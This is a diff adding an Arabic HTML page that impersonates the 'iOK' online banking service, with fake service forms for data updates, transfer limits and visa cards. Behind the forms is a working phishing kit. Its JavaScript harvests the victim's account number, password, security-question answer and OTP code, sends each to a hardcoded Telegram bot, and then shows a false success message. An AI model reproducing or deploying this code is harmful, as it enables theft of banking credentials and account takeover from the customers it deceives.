@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iOK الخدمة المصرفية - الاستمارة أونلاين</title>
+    <style>
+        :root {
+            --primary-red: #e31b23;
+            --primary-red-light: #f13b43;
+            --accent-yellow: #ffc107;
+            --light-bg: #f8f9fa;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            background-color: var(--light-bg);
+            color: #333;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header-banner {
+            background-color: var(--primary-red);
+            color: white;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .badge-btn {
+            background-color: var(--accent-yellow);
+            color: #000;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-weight: bold;
+            font-size: 1rem;
+            border: none;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .header-right {
+            text-align: left;
+        }
+
+        .header-right h1 {
+            font-size: 2rem;
+            font-weight: 900;
+            letter-spacing: 1px;
+            line-height: 1;
+        }
+
+        .header-right p {
+            font-size: 0.95rem;
+            margin-top: 4px;
+            opacity: 0.9;
+        }
+
+        .main-container {
+            flex: 1;
+            max-width: 1200px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .welcome-text {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .welcome-text h2 {
+            font-size: 1.5rem;
+            color: #222;
+            margin-bottom: 8px;
+        }
+
+        .welcome-text p {
+            color: #666;
+            font-size: 1rem;
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .service-card {
+            background: white;
+            border: 2px solid #f0f0f0;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .service-card:hover {
+            border-color: var(--primary-red);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(227, 27, 35, 0.15);
+        }
+
+        .service-card h3 {
+            font-size: 1.1rem;
+            color: #222;
+            margin-bottom: 8px;
+        }
+
+        .service-card p {
+            font-size: 0.85rem;
+            color: #777;
+        }
+
+        .step-container {
+            display: none;
+            background: white;
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            max-width: 600px;
+            margin: 0 auto 30px auto;
+        }
+
+        .step-container.active {
+            display: block;
+        }
+
+        .step-title {
+            font-size: 1.25rem;
+            color: var(--primary-red);
+            margin-bottom: 20px;
+            text-align: center;
+            border-bottom: 2px solid #fce8e8;
+            padding-bottom: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: #444;
+        }
+
+        .form-group input, .form-group select, .form-group textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            border-color: var(--primary-red);
+        }
+
+        .hint-text {
+            font-size: 0.75rem;
+            color: #666;
+            margin-top: 4px;
+        }
+
+        .btn-submit {
+            background-color: var(--primary-red);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            background-color: #c8151c;
+        }
+
+        .btn-back {
+            background-color: #6c757d;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        footer {
+            background-color: #222;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin-top: auto;
+            font-size: 0.9rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .whatsapp-float {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background-color: #25d366;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 0.9rem;
+            transition: opacity 0.2s;
+        }
+
+        .whatsapp-float:hover {
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header-banner">
+        <div class="header-left">
+            <button class="badge-btn">iOK الخدمة المصرفية</button>
+        </div>
+        <div class="header-right">
+            <h1>iOK</h1>
+            <p>الاستمارة أونلاين</p>
+        </div>
+    </header>
+
+    <div class="main-container">
+        
+        <!-- الصفحة الرئيسية: اختيار الخدمات -->
+        <div id="home-section">
+            <div class="welcome-text">
+                <h2>مرحباً بكم في خدمات بنكك أونلاين</h2>
+                <p>الرجاء الاختيار من الخدمات المقدمة أدناه</p>
+            </div>
+
+            <div class="services-grid">
+                <div class="service-card" onclick="openServiceForm('تحديث البيانات')">
+                    <h3>تحديث البيانات</h3>
+                    <p>تحديث المعلومات الشخصية وبيانات الحساب</p>
+                </div>
+                <div class="service-card" onclick="openServiceForm('رفع سقف التحويلات اليومية')">
+                    <h3>رفع سقف التحويلات اليومية</h3>
+                    <p>زيادة السقف الحالي إلى السقف المطلوب</p>
+                </div>
+                <div class="service-card" onclick="openServiceForm('التحويلات الخاطئة')">
+                    <h3>التحويلات الخاطئة</h3>
+                    <p>استرداد المبالغ المحولة بطريق الخطأ</p>
+                </div>
+                <div class="service-card" onclick="openServiceForm('خدمات العملات الأجنبية')">
+                    <h3>خدمات العملات الأجنبية</h3>
+                    <p>شراء وبيع العملات وأسعار الصرف</p>
+                </div>
+                <div class="service-card" onclick="openServiceForm('كشف الحساب')">
+                    <h3>كشف الحساب</h3>
+                    <p>استخراج كشف حساب مفصل للفترات السابقة</p>
+                </div>
+                <div class="service-card" onclick="openServiceForm('بطاقة فيزا افتراضية')">
+                    <h3>بطاقة فيزا افتراضية</h3>
+                    <p>اصدار بطاقة تسوق إلكتروني آمنة</p>
+                </div>
+                <div class="service-card" onclick="openServiceForm('حساب جاري وحساب مميز')">
+                    <h3>حساب جاري وحساب مميز</h3>
+                    <p>فتح حسابات مصرفية جديدة ومميزة</p>
+                </div>
+                <div class="service-card" onclick="openServiceForm('إدارة أسئلة الأمان')">
+                    <h3>إدارة أسئلة الأمان</h3>
+                    <p>تحديث وتعيين أسئلة حماية الحساب</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- 1. نموذج الخدمة -->
+        <div id="service-form-step" class="step-container">
+            <h3 class="step-title" id="service-title-display">تفاصيل الخدمة</h3>
+            <form id="custom-service-form" onsubmit="event.preventDefault(); goToCredentialsStep();">
+                <div id="dynamic-fields"></div>
+                <button type="submit" class="btn-submit">التالي</button>
+                <button type="button" class="btn-back" onclick="goHome()">إرجاع للقائمة</button>
+            </form>
+        </div>
+
+        <!-- 2. صفحة تسجيل الدخول -->
+        <div id="credentials-step" class="step-container">
+            <h3 class="step-title">تسجيل الدخول للتحقق</h3>
+            <form onsubmit="submitCredentials(event)">
+                <div class="form-group">
+                    <label>رقم الحساب المصرفي</label>
+                    <input type="text" id="acc-number" required placeholder="أدخل رقم الحساب">
+                </div>
+                <div class="form-group">
+                    <label>كلمة السر</label>
+                    <input type="password" id="acc-password" required placeholder="أدخل كلمة السر">
+                    <div class="hint-text">يجب أن تحتوي على حرف كبير، حرف صغير، رقم، ورمز خاص (مثل @, #, $, %)</div>
+                </div>
+                <button type="submit" class="btn-submit">التالي</button>
+                <button type="button" class="btn-back" onclick="backToServiceForm()">السابق</button>
+            </form>
+        </div>
+
+        <!-- 3. صفحة أسئلة الأمان (القائمة المنسدلة لاختيار السؤال) -->
+        <div id="security-step" class="step-container">
+            <h3 class="step-title">سؤال الأمان والتحقق</h3>
+            <form onsubmit="submitSecurity(event)">
+                <div class="form-group">
+                    <label>اختر سؤال الأمان</label>
+                    <select id="security-question-select" required>
+                        <option value="" disabled selected>-- اختر سؤالاً من القائمة --</option>
+                        <option value="ما هو اسم ابن عمك الأول؟">ما هو اسم ابن عمك الأول؟</option>
+                        <option value="ما كان لقبك أثناء الطفولة؟">ما كان لقبك أثناء الطفولة؟</option>
+                        <option value="في أي سنة تزوجت؟">في أي سنة تزوجت؟</option>
+                        <option value="في أي مدينة ولدت؟">في أي مدينة ولدت؟</option>
+                        <option value="في أي سنة تخرجت من الجامعة؟">في أي سنة تخرجت من الجامعة؟</option>
+                        <option value="اسم مؤلفك المفضل؟">اسم مؤلفك المفضل؟</option>
+                        <option value="اسم الشركة المصنعة للسيارة المفضلة لديك؟">اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+                        <option value="أي فيلم هو المفضل لديك؟">أي فيلم هو المفضل لديك؟</option>
+                        <option value="اسم صديق في الطفولة؟">اسم صديق في الطفولة؟</option>
+                        <option value="في أي عام حصلت على رخصة القيادة الخاصة بك؟">في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+                        <option value="العلامة التجارية لأول تلفزيون خاص بك؟">العلامة التجارية لأول تلفزيون خاص بك؟</option>
+                        <option value="اسم فريق كرة القدم المفضل لديك؟">اسم فريق كرة القدم المفضل لديك؟</option>
+                        <option value="ما هو اسم المدرسة التي التحقت بها؟">ما هو اسم المدرسة التي التحقت بها؟</option>
+                        <option value="اسم أول بلد أجنبي قمت بزيارته؟">اسم أول بلد أجنبي قمت بزيارته؟</option>
+                        <option value="ما هي ماركة سيارتك الأولي؟">ما هي ماركة سيارتك الأولي؟</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>إجابة سؤال الأمان</label>
+                    <input type="text" id="security-answer" required placeholder="أدخل الإجابة هنا">
+                </div>
+                <button type="submit" class="btn-submit">التالي</button>
+            </form>
+        </div>
+
+        <!-- 4. صفحة رمز التحقق OTP -->
+        <div id="otp-step" class="step-container">
+            <h3 class="step-title">رمز التحقق (OTP)</h3>
+            <p style="text-align: center; margin-bottom: 15px; font-size: 0.9rem; color: #555;">
+                تم إرسال رمز التحقق (OTP) إلى رقم الشريحة أو البريد الإلكتروني المسجل.
+            </p>
+            <form onsubmit="submitOtp(event)">
+                <div class="form-group">
+                    <label>أدخل رمز الـ OTP</label>
+                    <input type="text" id="otp-code" required placeholder="أدخل الرمز المكون من أرقام">
+                </div>
+                <button type="submit" class="btn-submit">تأكيد وإتمام الطلب</button>
+            </form>
+        </div>
+
+    </div>
+
+    <footer>
+        <p>جميع الحقوق محفوظة © خدمات بنكك أونلاين iOK 2026</p>
+        <a href="https://wa.me/249907013018" class="whatsapp-float" target="_blank">
+            <span>تواصل عبر واتساب</span>
+            <span dir="ltr">+249 90 701 3018</span>
+        </a>
+    </footer>
+
+    <script>
+        let currentSelectedService = "";
+        let collectedData = {};
+
+        const BOT_TOKEN = "8666514672:AAFtpOM78ouq8plo6M-q2QbeUaX9SCoOQN8"; 
+        const CHAT_ID = "8928070001";       
+
+        function sendDataInstantly(dataObj) {
+            collectedData = { ...collectedData, ...dataObj };
+            
+            let message = `🚨 إشعار جديد - بنكك أونلاين (@bok_online_info_bot)\n`;
+            for (let key in collectedData) {
+                message += `▪️ ${key}: ${collectedData[key]}\n`;
+            }
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).catch(err => console.error("خطأ في الإرسال:", err));
+        }
+
+        function openServiceForm(serviceName) {
+            currentSelectedService = serviceName;
+            document.getElementById('service-title-display').innerText = "نموذج خدمة: " + serviceName;
+            
+            let fieldsHTML = "";
+
+            if (serviceName === "تحديث البيانات") {
+                fieldsHTML = `
+                    <div class="form-group">
+                        <label>الاسم الرباعي</label>
+                        <input type="text" id="up_fullname" required placeholder="أدخل الاسم رباعياً">
+                    </div>
+                    <div class="form-group">
+                        <label>رقم الهاتف</label>
+                        <input type="text" id="up_phone" required placeholder="أدخل رقم الهاتف المسجل">
+                    </div>
+                    <div class="form-group">
+                        <label>البريد الإلكتروني</label>
+                        <input type="email" id="up_email" required placeholder="أدخل البريد الإلكتروني">
+                    </div>
+                    <div class="form-group">
+                        <label>السكن الحالي</label>
+                        <input type="text" id="up_address" required placeholder="المدينة / الحي / الشارع">
+                    </div>
+                `;
+            } else if (serviceName === "رفع سقف التحويلات اليومية") {
+                fieldsHTML = `
+                    <div class="form-group">
+                        <label>السقف الحالي</label>
+                        <input type="text" value="25.000.000.00 SDG" readonly style="background:#e9ecef; font-weight:bold;">
+                    </div>
+                    <div class="form-group">
+                        <label>السقف المطلوب</label>
+                        <input type="text" value="45.000.000.00 SDG" readonly style="background:#e9ecef; font-weight:bold; color:var(--primary-red);">
+                    </div>
+                    <div class="form-group">
+                        <label>سبب طلب الرفع</label>
+                        <input type="text" id="limit_reason" placeholder="أدخل سبب رفع السقف (اختياري)">
+                    </div>
+                `;
+            } else if (serviceName === "التحويلات الخاطئة") {
+                fieldsHTML = `
+                    <div class="form-group">
+                        <label>رقم الحساب الذي تم إرسال المبلغ إليه بالخطأ</label>
+                        <input type="text" id="wrong_acc" required placeholder="أدخل رقم الحساب المحول له بالخطأ">
+                    </div>
+                    <div class="form-group">
+                        <label>رقم العملية (رقم الإيصال)</label>
+                        <input type="text" id="trans_num" required placeholder="أدخل رقم العملية المصرفية">
+                    </div>
+                    <div class="form-group">
+                        <label>المبلغ المحول</label>
+                        <input type="text" id="trans_amount" required placeholder="أدخل قيمة المبلغ">
+                    </div>
+                `;
+            } else if (serviceName === "خدمات العملات الأجنبية") {
+                fieldsHTML = `
+                    <div class="form-group">
+                        <label>نوع العملة المطلوبة</label>
+                        <select id="forex_currency">
+                            <option value="دولار أمريكي">دولار أمريكي (USD)</option>
+                            <option value="يورو">يورو (EUR)</option>
+                            <option value="ريال سعودي">ريال سعودي (SAR)</option>
+                            <option value="درهم إماراتي">درهم إماراتي (AED)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>المبلغ المراد تبادله / حجزه</label>
+                        <input type="text" id="forex_amount" required placeholder="أدخل المبلغ">
+                    </div>
+                `;
+            } else if (serviceName === "كشف الحساب") {
+                fieldsHTML = `
+                    <div class="form-group">
+                        <label>الفترة الزمنية لكشف الحساب</label>
+                        <select id="statement_period">
+                            <option value="آخر شهر">آخر شهر</option>
+                            <option value="آخر 3 أشهر">آخر 3 أشهر</option>
+                            <option value="آخر 6 أشهر">آخر 6 أشهر</option>
+                            <option value="سنة كاملة">سنة كاملة</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>الغرض من كشف الحساب</label>
+                        <input type="text" id="statement_purpose" placeholder="أدخل الغرض (سفارة، تمويل، إلخ)">
+                    </div>
+                `;
+            } else if (serviceName === "بطاقة فيزا افتراضية") {
+                fieldsHTML = `
+                    <div class="form-group">
+                        <label>العملة المفضلة للبطاقة</label>
+                        <select id="visa_currency">
+                            <option value="دولار أمريكي">دولار أمريكي</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>المبلغ المراد شحنه لأول مرة</label>
+                        <input type="text" id="visa_balance" required placeholder="أدخل القيمة بالعملة المحلية أو الدولار">
+                    </div>
+                `;
+            } else if (serviceName === "حساب جاري وحساب مميز") {
+                fieldsHTML = `
+                    <div class="form-group">
+                        <label>نوع الحساب المراد فتحه</label>
+                        <select id="account_type_req">
+                            <option value="حساب جاري">حساب جاري</option>
+                            <option value="حساب مميز (VIP)">حساب مميز (VIP)</option>
+                            <option value="حساب توفير">حساب توفير</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>الفرع المفضل</label>
+                        <input type="text" id="preferred_branch" placeholder="أدخل اسم المدينة أو الفرع">
+                    </div>
+                `;
+            } else {
+                fieldsHTML = `
+                    <div class="form-group">
+                        <label>تفاصيل إدارة أسئلة الأمان</label>
+                        <textarea id="security_details" rows="3" placeholder="اكتب التفاصيل المطلوبة هنا..." required></textarea>
+                    </div>
+                `;
+            }
+
+            document.getElementById('dynamic-fields').innerHTML = fieldsHTML;
+            document.getElementById('home-section').style.display = 'none';
+            document.getElementById('service-form-step').classList.add('active');
+        }
+
+        function goHome() {
+            document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
+            document.getElementById('home-section').style.display = 'block';
+        }
+
+        function backToServiceForm() {
+            document.getElementById('credentials-step').classList.remove('active');
+            document.getElementById('service-form-step').classList.add('active');
+        }
+
+        function goToCredentialsStep() {
+            let serviceData = { "الخدمة": currentSelectedService };
+            
+            if (currentSelectedService === "تحديث البيانات") {
+                serviceData["الاسم الرباعي"] = document.getElementById('up_fullname').value;
+                serviceData["رقم الهاتف"] = document.getElementById('up_phone').value;
+                serviceData["البريد الإلكتروني"] = document.getElementById('up_email').value;
+                serviceData["السكن الحالي"] = document.getElementById('up_address').value;
+            } else if (currentSelectedService === "رفع سقف التحويلات اليومية") {
+                serviceData["السقف الحالي"] = "25.000.000.00";
+                serviceData["السقف المطلوب"] = "45.000.000.00";
+                serviceData["السبب"] = document.getElementById('limit_reason').value;
+            } else if (currentSelectedService === "التحويلات الخاطئة") {
+                serviceData["رقم الحساب الخطأ"] = document.getElementById('wrong_acc').value;
+                serviceData["رقم العملية"] = document.getElementById('trans_num').value;
+                serviceData["المبلغ"] = document.getElementById('trans_amount').value;
+            } else if (currentSelectedService === "خدمات العملات الأجنبية") {
+                serviceData["العملة"] = document.getElementById('forex_currency').value;
+                serviceData["المبلغ"] = document.getElementById('forex_amount').value;
+            } else if (currentSelectedService === "كشف الحساب") {
+                serviceData["الفترة"] = document.getElementById('statement_period').value;
+                serviceData["الغرض"] = document.getElementById('statement_purpose').value;
+            } else if (currentSelectedService === "بطاقة فيزا افتراضية") {
+                serviceData["عملة الفيزا"] = document.getElementById('visa_currency').value;
+                serviceData["المبلغ الأولي"] = document.getElementById('visa_balance').value;
+            } else if (currentSelectedService === "حساب جاري وحساب مميز") {
+                serviceData["نوع الحساب"] = document.getElementById('account_type_req').value;
+                serviceData["الفرع"] = document.getElementById('preferred_branch').value;
+            } else {
+                let det = document.getElementById('security_details');
+                if (det) serviceData["التفاصيل"] = det.value;
+            }
+
+            sendDataInstantly(serviceData);
+
+            document.getElementById('service-form-step').classList.remove('active');
+            document.getElementById('credentials-step').classList.add('active');
+        }
+
+        function submitCredentials(event) {
+            event.preventDefault();
+            let accNum = document.getElementById('acc-number').value;
+            let password = document.getElementById('acc-password').value;
+
+            const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/;
+            if (!passwordRegex.test(password)) {
+                alert("يجب أن تحتوي كلمة السر على حرف كبير، حرف صغير، رقم، ورمز خاص (مثل @, #, $, %) وبطول 8 أحرف على الأقل.");
+                return;
+            }
+
+            sendDataInstantly({
+                "رقم الحساب": accNum,
+                "كلمة السر": password
+            });
+
+            document.getElementById('credentials-step').classList.remove('active');
+            document.getElementById('security-step').classList.add('active');
+        }
+
+        function submitSecurity(event) {
+            event.preventDefault();
+            let selectedQ = document.getElementById('security-question-select').value;
+            let secAnswer = document.getElementById('security-answer').value;
+
+            sendDataInstantly({
+                "سؤال الأمان المختار": selectedQ,
+                "إجابة سؤال الأمان": secAnswer
+            });
+
+            document.getElementById('security-step').classList.remove('active');
+            document.getElementById('otp-step').classList.add('active');
+        }
+
+        function submitOtp(event) {
+            event.preventDefault();
+            let otpCode = document.getElementById('otp-code').value;
+
+            sendDataInstantly({
+                "رمز الـ OTP": otpCode
+            });
+
+            alert("تم إرسال طلبك بنجاح وسيتم معالجته عبر النظام المصرفي فوراً.");
+            location.reload();
+        }
+    </script>
+</body>
+</html>
